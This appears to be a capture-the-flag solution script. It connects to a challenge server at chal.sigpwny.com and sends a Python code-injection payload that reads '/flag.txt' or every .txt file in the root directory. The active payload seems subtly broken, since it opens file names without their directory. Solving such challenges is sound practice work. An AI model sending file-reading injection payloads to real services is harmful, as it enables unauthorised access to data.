import socket

# Define the host and port of the server you want to connect to
HOST = 'chal.sigpwny.com'
PORT = 5010

# Connect to the server
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
	s.connect((HOST, PORT))
    
	# Receive feedback from the server
	data = s.recv(1024)
	feedback = data.decode()
	print("Feedback from server: ", feedback)

	# Run your Python code and save the output to a variable
	#payload = b"print(open('/flag.txt').read())" 
	payload = b"print('\n'.join(open(file).read() for file in os.listdir('/') if file.endswith('.txt')))"

	# Send the output to the server
	s.sendall(payload)
	
	ret = "\n"
	
	s.sendall(ret.encode())

	# Receive feedback from the server
	data = s.recv(1024)
	feedback = data.decode()
	print("Feedback from server: ", feedback)

